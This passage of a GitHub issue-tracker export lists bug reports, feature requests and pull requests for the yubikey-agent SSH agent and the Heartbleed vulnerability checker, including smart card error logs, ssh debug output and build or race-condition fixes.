Setup should print the existing public key and then offer the flag to reset and start fresh. I can try to implement and create a PR if you accept this feature.",NA,FALSE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/18/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/18/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/18/events,https://github.com/FiloSottile/yubikey-agent/issues/18,NA
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/17,615495606,MDU6SXNzdWU2MTU0OTU2MDY=,17,"SSH_AUTH_SOCK should be set per user, not system-wide",81202,closed,FALSE,NA,NA,13,2020-05-10T23:00:26Z,2020-06-21T00:43:57Z,2020-06-20T22:39:40Z,NONE,NA,"The current suggestion of setting `SSH_AUTH_SOCK` to `/usr/local/var/run/yubikey-agent.sock` doesn't take shared, multi-user systems into account, i.e. switch user, etc.

Setting it to `/tmp/${USER}-yubikey-agent.socket` or `$HOME/.yubikey-agent.sock`, etc. would probably make more sense, no?",NA,FALSE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/17/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/17/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/17/events,https://github.com/FiloSottile/yubikey-agent/issues/17,NA
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/16,615457995,MDU6SXNzdWU2MTU0NTc5OTU=,16,ssh fails to connect to agent,689411,closed,FALSE,NA,NA,3,2020-05-10T19:20:33Z,2020-05-25T05:39:01Z,2020-05-10T20:16:12Z,NONE,NA,"There seems to be something slightly strange going on for me on my mac:

if I run the agent directly myself (in the foreground) I can connect to the `AUTH_SOCK` and everything is fine.

On the other hand, if I attempt to let `brew services` start the agent (which I believe is root) my user can not longer access the agent `AUTH_SOCK`, I basically just get permission denied.

Do I have my mac set up in some strange way?",NA,FALSE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/16/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/16/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/16/events,https://github.com/FiloSottile/yubikey-agent/issues/16,NA
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/15,615433253,MDU6SXNzdWU2MTU0MzMyNTM=,15,smart card error 6a80: incorrect parameter in command data field on linux,409689,open,FALSE,NA,NA,5,2020-05-10T17:02:03Z,2021-02-05T11:16:15Z,NA,NONE,NA,"with commit 742bc61fbe38ed11af6b48408cb5e3e78053cb79
and pcsc-lite-devel-1.8.26-1.fc31.x86_64 on fedora 31

$ ykman info
Device type: YubiKey 4
Firmware version: 4.3.7
Enabled USB interfaces: FIDO+CCID

Applications
OTP     	Disabled     	
FIDO U2F	Enabled      	
OpenPGP 	Enabled      	
PIV     	Enabled      	
OATH    	Enabled      	
FIDO2   	Not available	

$ ykman piv reset
WARNING! This will delete all stored PIV data and restore factory settings. Proceed? [y/N]: y
Resetting PIV data...
Success! All PIV data have been cleared from your YubiKey.
Your YubiKey now has the default PIN, PUK and Management Key:
	PIN:	123456
	PUK:	12345678
	Management Key:	010203040506070801020304050607080102030405060708

I get the following error:

The default PIN did not work

printed out the err, which says:

smart card error 6a80: incorrect parameter in command data field",NA,FALSE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/15/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/15/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/15/events,https://github.com/FiloSottile/yubikey-agent/issues/15,NA
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/14,615349093,MDU6SXNzdWU2MTUzNDkwOTM=,14,smart card error 6d00 with YubiKey 4.2.8,1185739,closed,FALSE,NA,NA,5,2020-05-10T09:06:03Z,2020-06-20T22:18:32Z,2020-06-20T22:18:32Z,NONE,NA,"I am getting errors trying to make this work with my YubiKey :

- macOS Catalina 10.15.4
- YubiKey 4.2.8
- yubikey-agent: stable 0.1.1

**yubikey-agent.log**

```
Connecting to the YubiKey...
Reconnecting to the YubiKey...
agent 13: failed to prepare private key: get attestation cert: command failed: smart card error 6d00
agent 17: operation unsupported
```

**SSH log**

```
ssh -v -T git@github.com
OpenSSH_8.1p1, LibreSSL 2.7.3
debug1: Reading configuration data /Users/philippe/.ssh/config
debug1: Reading configuration data /etc/ssh/ssh_config
debug1: /etc/ssh/ssh_config line 47: Applying options for *
debug1: Connecting to github.com port 22.
debug1: Connection established.
debug1: identity file /Users/philippe/.ssh/id_rsa type -1
debug1: identity file /Users/philippe/.ssh/id_rsa-cert type -1
debug1: identity file /Users/philippe/.ssh/id_dsa type -1
debug1: identity file /Users/philippe/.ssh/id_dsa-cert type -1
debug1: identity file /Users/philippe/.ssh/id_ecdsa type -1
debug1: identity file /Users/philippe/.ssh/id_ecdsa-cert type -1
debug1: identity file /Users/philippe/.ssh/id_ed25519 type -1
debug1: identity file /Users/philippe/.ssh/id_ed25519-cert type -1
debug1: identity file /Users/philippe/.ssh/id_xmss type -1
debug1: identity file /Users/philippe/.ssh/id_xmss-cert type -1
debug1: Local version string SSH-2.0-OpenSSH_8.1
debug1: Remote protocol version 2.0, remote software version babeld-a950f115
debug1: no match: babeld-a950f115
debug1: Authenticating to github.com:22 as 'git'
debug1: SSH2_MSG_KEXINIT sent
debug1: SSH2_MSG_KEXINIT received
debug1: kex: algorithm: curve25519-sha256
debug1: kex: host key algorithm: rsa-sha2-512
debug1: kex: server->client cipher: chacha20-poly1305@openssh.com MAC: <implicit> compression: none
debug1: kex: client->server cipher: chacha20-poly1305@openssh.com MAC: <implicit> compression: none
debug1: expecting SSH2_MSG_KEX_ECDH_REPLY
debug1: Server host key: ssh-rsa SHA256:nThbg6kXUpJWGl7E1IGOCspRomTxdCARLviKw6E5SY8
debug1: Host 'github.com' is known and matches the RSA host key.
debug1: Found key in /Users/philippe/.ssh/known_hosts:1
debug1: rekey out after 134217728 blocks
debug1: SSH2_MSG_NEWKEYS sent
debug1: expecting SSH2_MSG_NEWKEYS
debug1: SSH2_MSG_NEWKEYS received
debug1: rekey in after 134217728 blocks
debug1: Will attempt key: YubiKey #4250300 PIV Slot 9a ECDSA SHA256:d4oDsV8IJotbZPVnmCgWbKTkwv4cwVlf81CFaMWkU6w agent
debug1: Will attempt key: /Users/philippe/.ssh/id_rsa
debug1: Will attempt key: /Users/philippe/.ssh/id_dsa
debug1: Will attempt key: /Users/philippe/.ssh/id_ecdsa
debug1: Will attempt key: /Users/philippe/.ssh/id_ed25519
debug1: Will attempt key: /Users/philippe/.ssh/id_xmss
debug1: SSH2_MSG_EXT_INFO received
debug1: kex_input_ext_info: server-sig-algs=<ssh-ed25519,ecdsa-sha2-nistp256,ecdsa-sha2-nistp384,ecdsa-sha2-nistp521,ssh-rsa,rsa-sha2-512,rsa-sha2-256,ssh-dss>
debug1: SSH2_MSG_SERVICE_ACCEPT received
debug1: Authentications that can continue: publickey
debug1: Next authentication method: publickey
debug1: Offering public key: YubiKey #4250300 PIV Slot 9a ECDSA SHA256:d4oDsV8IJotbZPVnmCgWbKTkwv4cwVlf81CFaMWkU6w agent
debug1: Server accepts key: YubiKey #4250300 PIV Slot 9a ECDSA SHA256:d4oDsV8IJotbZPVnmCgWbKTkwv4cwVlf81CFaMWkU6w agent
sign_and_send_pubkey: signing failed: agent refused operation
debug1: Trying private key: /Users/philippe/.ssh/id_rsa
debug1: Trying private key: /Users/philippe/.ssh/id_dsa
debug1: Trying private key: /Users/philippe/.ssh/id_ecdsa
debug1: Trying private key: /Users/philippe/.ssh/id_ed25519
debug1: Trying private key: /Users/philippe/.ssh/id_xmss
debug1: No more authentication methods to try.
git@github.com: Permission denied (publickey).
```",NA,FALSE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/14/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/14/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/14/events,https://github.com/FiloSottile/yubikey-agent/issues/14,NA
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/13,615071228,MDU6SXNzdWU2MTUwNzEyMjg=,13,Running -setup --really-delete-all-piv-keys fails,2140018,closed,FALSE,NA,NA,1,2020-05-09T02:25:00Z,2020-06-20T22:18:32Z,2020-06-20T22:18:32Z,NONE,NA,"```
$ go run . -setup --really-delete-all-piv-keys
Resetting YubiKey PIV applet...
Failed to reset YubiKey: blocking pin: verify pin: smart card error 6302
exit status 1
```

Strangely, it does succeed if you repeat the command a couple of times. This happens with a Yubikey Neo on Arch Linux.",NA,FALSE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/13/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/13/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/13/events,https://github.com/FiloSottile/yubikey-agent/issues/13,NA
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/12,614995554,MDU6SXNzdWU2MTQ5OTU1NTQ=,12,Setup should say something about PUK/management PIN story,305104,closed,FALSE,NA,NA,1,2020-05-08T21:25:47Z,2020-05-10T02:16:32Z,2020-05-10T02:16:32Z,NONE,NA,"Now the setup only prompts for PIN.

It should explicitly say if management PIN and PUK have been set up. It says it is locked if wrong PIN is entered 3 times. But what after it's locked, do you need to reset or is there something else?

If there's some ""advanced usage"", maybe point to doc how to do it? At minimum should say if PUK/management secret were randomized or not, and if they're available somehow.

Would it be a problem to print them and say ""store securely in password manager""? In either case it should be explicitly said if it is randomized or default.",NA,FALSE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/12/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/12/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/12/events,https://github.com/FiloSottile/yubikey-agent/issues/12,NA
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/11,614995260,MDU6SXNzdWU2MTQ5OTUyNjA=,11,Linux packages,1225294,open,FALSE,NA,NA,4,2020-05-08T21:25:06Z,2020-07-13T21:42:39Z,NA,OWNER,NA,We should have binary packages for Linux that install a user systemd unit.,NA,FALSE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/11/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/11/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/11/events,https://github.com/FiloSottile/yubikey-agent/issues/11,NA
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/10,614994877,MDU6SXNzdWU2MTQ5OTQ4Nzc=,10,Linux -install support,1225294,closed,FALSE,NA,NA,3,2020-05-08T21:24:13Z,2020-06-21T18:48:24Z,2020-06-21T18:48:24Z,OWNER,NA,"On Linux, running `yubikey-agent -install` should create, install, and start a local user systemd unit, and show the environment variable the user needs to set (where the socket is in a relevant stable path in the home).",NA,FALSE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/10/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/10/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/10/events,https://github.com/FiloSottile/yubikey-agent/issues/10,NA
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/9,614985984,MDExOlB1bGxSZXF1ZXN0NDE1NDMyNzk0,9,yubikey-agent: add systemd/Linux setup instructions,1926905,closed,FALSE,NA,NA,4,2020-05-08T21:03:34Z,2020-05-11T15:24:51Z,2020-05-11T15:24:46Z,NONE,NA,Works on my machine(tm)!,NA,TRUE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/9/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/9/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/9/events,https://github.com/FiloSottile/yubikey-agent/pull/9,https://api.github.com/repos/FiloSottile/yubikey-agent/pulls/9
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/8,614967978,MDU6SXNzdWU2MTQ5Njc5Nzg=,8,Prompt for touch,305104,closed,FALSE,NA,NA,1,2020-05-08T20:25:08Z,2020-06-21T00:57:21Z,2020-06-21T00:57:21Z,NONE,NA,"SSH connection hanging due to touch required can be confusing at least in the beginning / after long time. It would be good to indicate to the user somehow that touch is required. Blinking light can be easy to miss, depending on physical placement of the key.",NA,FALSE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/8/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/8/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/8/events,https://github.com/FiloSottile/yubikey-agent/issues/8,NA
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/7,611308197,MDU6SXNzdWU2MTEzMDgxOTc=,7,windows support,388354,open,FALSE,NA,NA,3,2020-05-03T01:15:47Z,2020-07-29T19:30:36Z,NA,NONE,NA,"Hello @FiloSottile I'm curious if you're already interested in a windows port. In your last stream you stated that you would like to have windows on board but later on. If you're already in the state of accepting PRs which add functionalities I would be happy to work with you in order to contribute my work back.

If you want to have a look, the code is over at [tobiaskohlbau/yubikey-agent](https://github.com/tobiaskohlbau/yubikey-agent/tree/feature/windowsSupport). For now it depends on a local version of [go-piv/piv-go](https://github.com/go-piv/piv-go) but this should be obsolete as soon as go-piv/piv-go#57 is merged.

This works out of the box with the ssh client which is included in windows 10. With the help of another utility program it's also possible to get the ssh-agent into WSL2(windows subystem for linux).

BTW thanks for your work and your stream :-). This taught me that their exist other ways than gpg to use my yubikey for ssh.",NA,FALSE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/7/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/7/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/7/events,https://github.com/FiloSottile/yubikey-agent/issues/7,NA
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/6,607115967,MDU6SXNzdWU2MDcxMTU5Njc=,6,"PIN policy ""ALWAYS"" not working",305104,closed,FALSE,NA,NA,3,2020-04-26T21:19:17Z,2021-02-15T08:58:10Z,2020-04-26T22:52:59Z,NONE,NA,"# Reproduction

## Reset and configure key policy
```
$ ykman piv reset
WARNING! This will delete all stored PIV data and restore factory settings. Proceed? [y/N]: y
Resetting PIV data...
Success! All PIV data have been cleared from your YubiKey.
Your YubiKey now has the default PIN, PUK and Management Key:
	PIN:	123456
	PUK:	12345678
	Management Key:	010203040506070801020304050607080102030405060708
$ ykman piv import-key --pin-policy ALWAYS --touch-policy ALWAYS 9a key.pem
Enter a management key [blank to use default key]: 
$ ykman piv generate-certificate -s $USER 9a public.pem              
Enter PIN: 
Enter a management key [blank to use default key]: 
Touch your YubiKey...
```

## Start agent and set up authorized_keys

```
$ yubikey-agent &
$ export SSH_AUTH_SOCK=""/Users/joneskoo/Library/Caches/yubikey-agent.sock""
$ ssh-add -L  | set-up-authorized-keys server
```

## First login works

PIN is prompted and touch is required as expected.

```
$ ssh server
Login OK.
```


## Second login 

Touch is required but PIN is not prompted.

```
$ ssh server
sign_and_send_pubkey: signing failed: agent refused operation
```

Agent refuses and yubikey-agent logs:

```
2020/04/27 00:18:35 agent 13: command failed: smart card error 6982: security status not satisfied
```",NA,FALSE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/6/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/6/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/6/events,https://github.com/FiloSottile/yubikey-agent/issues/6,NA
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/5,607109570,MDU6SXNzdWU2MDcxMDk1NzA=,5,Data object or application not found,21230177,closed,FALSE,NA,NA,2,2020-04-26T20:46:32Z,2020-04-26T22:44:10Z,2020-04-26T21:04:56Z,NONE,NA,"Running on Ubuntu 20.04, when trying to login, I get:

agent 11: could not get public key: command failed: smart card error 6a82: data object or application not found

I have private keys loaded on my Yubikey 5 that I created via gpg.  I have SSH_AUTH_SOCK set and I installed libpcsclite-dev per piv-go instructions.  I also killed gpg-agent.  Any ideas what might be going on?  I",NA,FALSE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/5/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/5/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/5/events,https://github.com/FiloSottile/yubikey-agent/issues/5,NA
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/4,607095525,MDU6SXNzdWU2MDcwOTU1MjU=,4,yubikey-agent blocks Yubikey Manager,305104,open,FALSE,NA,NA,2,2020-04-26T19:37:41Z,2020-05-13T18:33:30Z,NA,NONE,NA,"At least on macOS, if I have yubikey-agent running and I have authenticated with it (just starting yubikey-agent does not reproduce the problem), Yubikey Manager hangs. It appears to hang in a call to PCSC, and with some experiments the PIV application seems to be where it blocks - which makes sense obviously.

I'm creating this to make a reminder now to document this behavior in upcoming README (including how to stop the agent if Yubikey Manager is needed). Depending on how setup will work, maybe the Yubikey Manager is not needed by general audience but there needs to be a way to free the interface (easiest to stop the agent). Feel free to close/replace with some other TODO of course.",NA,FALSE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/4/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/4/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/4/events,https://github.com/FiloSottile/yubikey-agent/issues/4,NA
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/3,607084261,MDU6SXNzdWU2MDcwODQyNjE=,3,Reuse of auth sock across multiple instances,305104,closed,FALSE,NA,NA,4,2020-04-26T18:45:19Z,2020-06-20T23:47:10Z,2020-06-20T23:47:10Z,NONE,NA,"I watched the Twitch stream after the fact. You were considering the auth sock name… The usual ssh agent uses its pid in the unix socket file name, which avoids conflicts in case of multiple instances.

If yubikey-agent is supposed to work with multiple instances of it running, it should probably do something similar, and PID is probably reasonable for this?

If it's not supposed to work with multiple instances running, it should probably fail startup with error. It does not do that currently.",NA,FALSE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/3/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/3/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/3/events,https://github.com/FiloSottile/yubikey-agent/issues/3,NA
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/2,607054797,MDU6SXNzdWU2MDcwNTQ3OTc=,2,Module import paths,1094012,closed,FALSE,NA,NA,2,2020-04-26T16:38:45Z,2020-05-08T21:09:18Z,2020-05-08T21:09:18Z,NONE,NA,"following.. which import paths are preferred?

```
$ go get -v filippo.io/yubikey-agent
go get filippo.io/yubikey-agent: unrecognized import path ""filippo.io/yubikey-agent"": reading https://filippo.io/yubikey-agent?go-get=1: 404 Not Found
 ~/go/src

$ go get -v github.com/FiloSottile/yubikey-agent
go: github.com/FiloSottile/yubikey-agent upgrade => v0.0.0-20200426062843-0096c094dcd2
go get: github.com/FiloSottile/yubikey-agent@v0.0.0-20200426062843-0096c094dcd2: parsing go.mod:
	module declares its path as: filippo.io/yubikey-agent
	        but was required as: github.com/FiloSottile/yubikey-agent
```",NA,FALSE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/2/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/2/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/2/events,https://github.com/FiloSottile/yubikey-agent/issues/2,NA
FiloSottile,yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/1,606959041,MDU6SXNzdWU2MDY5NTkwNDE=,1,SIGHUP channel should be buffered,3075069,closed,FALSE,NA,NA,3,2020-04-26T08:54:29Z,2020-04-26T16:05:55Z,2020-04-26T16:05:29Z,NONE,NA,"ciao Filippo,

according to the `signals.Notify` [documentation](https://golang.org/pkg/os/signal/#Notify), the channel should be buffered:

> Package signal will not block sending to c: the caller must ensure that c has sufficient
buffer space to keep up with the expected signal rate. For a channel used for notification
of just one signal value, a buffer of size 1 is sufficient.

I have to admit that I have always been partially confused by this requirement and by the various discussions that pop up from googling the subject.

Maybe in this particular case there is no practical difference but I noticed it:

https://github.com/FiloSottile/yubikey-agent/blob/0096c094dcd28799c7059e08e60650eb18577b86/main.go#L42",NA,FALSE,https://api.github.com/repos/FiloSottile/yubikey-agent,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/1/labels{/name},https://api.github.com/repos/FiloSottile/yubikey-agent/issues/1/comments,https://api.github.com/repos/FiloSottile/yubikey-agent/issues/1/events,https://github.com/FiloSottile/yubikey-agent/issues/1,NA
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/88,815282133,MDExOlB1bGxSZXF1ZXN0NTc5MTM3NDI1,88,Minor changes,52813,open,FALSE,NA,NA,0,2021-02-24T09:17:24Z,2021-02-24T09:17:24Z,NA,NONE,NA,"* Update the year in the license file
* Add a `go.mod` file, to make building with `go build` straightforward.",NA,TRUE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/88/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/88/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/88/events,https://github.com/FiloSottile/Heartbleed/pull/88,https://api.github.com/repos/FiloSottile/Heartbleed/pulls/88
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/87,86581335,MDU6SXNzdWU4NjU4MTMzNQ==,87,New release any time soon?,235410,open,FALSE,NA,NA,0,2015-06-09T12:26:30Z,2015-06-09T12:26:30Z,NA,NONE,NA,"I'd like to package a newer release than 0.1.0 and I'm not a fan of packaging git repos.
",NA,FALSE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/87/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/87/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/87/events,https://github.com/FiloSottile/Heartbleed/issues/87,NA
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/86,33033619,MDExOlB1bGxSZXF1ZXN0MTU2MjU3MDU=,86,Removes race condition,310004,closed,FALSE,NA,NA,0,2014-05-07T23:12:50Z,2015-07-14T21:09:54Z,2015-07-14T21:09:54Z,NONE,NA,"There's currently a data race when setting and accessing the closeNotifySent boolean value. I've solved this with the addition of a channel and a new non-blocking select statement.

Before this change (sad tests):

```
$ go test ./... -race
?       _/home/kevin/Checkouts/Heartbleed   [no test files]
==================
WARNING: DATA RACE
Read by goroutine 11:
  _/home/kevin/Checkouts/Heartbleed/bleed.func·001()
      /home/kevin/Checkouts/Heartbleed/bleed/heartbleed.go:108 +0x23f

Previous write by goroutine 12:
  _/home/kevin/Checkouts/Heartbleed/bleed.func·002()
      /home/kevin/Checkouts/Heartbleed/bleed/heartbleed.go:126 +0x74

Goroutine 11 (running) created at:
  _/home/kevin/Checkouts/Heartbleed/bleed.Heartbleed()
      /home/kevin/Checkouts/Heartbleed/bleed/heartbleed.go:120 +0x79f
  _/home/kevin/Checkouts/Heartbleed/bleed.TestBleedELB()
      /home/kevin/Checkouts/Heartbleed/bleed/bleed_test.go:24 +0x1fb
  testing.tRunner()
      /home/kevin/Checkouts/go/src/pkg/testing/testing.go:391 +0x10f

Goroutine 12 (finished) created at:
  _/home/kevin/Checkouts/Heartbleed/bleed.Heartbleed()
      /home/kevin/Checkouts/Heartbleed/bleed/heartbleed.go:127 +0x814
  _/home/kevin/Checkouts/Heartbleed/bleed.TestBleedELB()
      /home/kevin/Checkouts/Heartbleed/bleed/bleed_test.go:24 +0x1fb
  testing.tRunner()
      /home/kevin/Checkouts/go/src/pkg/testing/testing.go:391 +0x10f
==================
PASS
Found 1 data race(s)
FAIL    _/home/kevin/Checkouts/Heartbleed/bleed 7.971s
?       _/home/kevin/Checkouts/Heartbleed/bleed/tls [no test files]
?       _/home/kevin/Checkouts/Heartbleed/logger    [no test files]
?       _/home/kevin/Checkouts/Heartbleed/server    [no test files]
?       _/home/kevin/Checkouts/Heartbleed/server/cache  [no test files]
```

After this change (happy tests):

```
$ go test ./... -race
?     _/home/kevin/Checkouts/Heartbleed [no test files]
ok    _/home/kevin/Checkouts/Heartbleed/bleed 7.998s
?     _/home/kevin/Checkouts/Heartbleed/bleed/tls [no test files]
?     _/home/kevin/Checkouts/Heartbleed/logger  [no test files]
?     _/home/kevin/Checkouts/Heartbleed/server  [no test files]
?     _/home/kevin/Checkouts/Heartbleed/server/cache  [no test files]
```
",NA,TRUE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/86/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/86/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/86/events,https://github.com/FiloSottile/Heartbleed/pull/86,https://api.github.com/repos/FiloSottile/Heartbleed/pulls/86
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/84,32651167,MDU6SXNzdWUzMjY1MTE2Nw==,84,Add Metric reporting?,35755,open,FALSE,NA,NA,3,2014-05-01T21:50:58Z,2014-05-02T06:37:05Z,NA,CONTRIBUTOR,NA,"We've added a simple statsd metric reporting mechanism to our fork. It provides data to a statsd server as well as provides a per-instance, in memory JSON report locally. 

Would this be of interest for others? I can submit a PR or a separate branch that incorporates the code. 
",NA,FALSE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/84/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/84/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/84/events,https://github.com/FiloSottile/Heartbleed/issues/84,NA
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/83,32636231,MDExOlB1bGxSZXF1ZXN0MTU0MDAyNDU=,83,Add flag to cache data returned from a vuln check,35755,closed,FALSE,NA,NA,3,2014-05-01T18:35:16Z,2019-06-03T22:34:03Z,2019-06-03T22:34:03Z,CONTRIBUTOR,NA,"Data returned from a vuln may contain unknown or personal information. While this may be useful to individuals trying to fix libraries, it's not really appropriate to return that info to unknown parties. Adding a flag to disable this by default. 
",NA,TRUE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/83/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/83/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/83/events,https://github.com/FiloSottile/Heartbleed/pull/83,https://api.github.com/repos/FiloSottile/Heartbleed/pulls/83
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/82,32410368,MDExOlB1bGxSZXF1ZXN0MTUyNjc4MTU=,82,fixed a issue with a newline in the nested else,599430,closed,FALSE,NA,NA,2,2014-04-29T00:14:56Z,2014-06-14T21:14:34Z,2014-04-30T11:21:50Z,NONE,NA,"This corrects an issue that causes the whole program to crash. I have fixed it and tested it out with go run bleed.go. Please merge this tiny commit
",NA,TRUE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/82/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/82/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/82/events,https://github.com/FiloSottile/Heartbleed/pull/82,https://api.github.com/repos/FiloSottile/Heartbleed/pulls/82
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/81,32385662,MDExOlB1bGxSZXF1ZXN0MTUyNTIzOTY=,81,Fix compilation error on OSX 10.9.2 running basic cmdline tools,4176216,closed,FALSE,NA,NA,1,2014-04-28T18:28:34Z,2014-06-15T14:16:38Z,2014-04-30T11:21:50Z,CONTRIBUTOR,NA,"go version go1.2.1 darwin/amd64

Robs-MacBook-Air:~ rtshanks$ go get github.com/FiloSottile/Heartbleed
src/go/src/github.com/FiloSottile/Heartbleed/bleed.go:59: syntax error:
unexpected semicolon or newline before else
src/go/src/github.com/FiloSottile/Heartbleed/bleed.go:63: syntax error:
unexpected else, expecting semicolon or newline
src/go/src/github.com/FiloSottile/Heartbleed/bleed.go:65:
non-declaration statement outside function body
src/go/src/github.com/FiloSottile/Heartbleed/bleed.go:66:
non-declaration statement outside function body
src/go/src/github.com/FiloSottile/Heartbleed/bleed.go:67: syntax error:
unexpected }
",NA,TRUE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/81/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/81/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/81/events,https://github.com/FiloSottile/Heartbleed/pull/81,https://api.github.com/repos/FiloSottile/Heartbleed/pulls/81
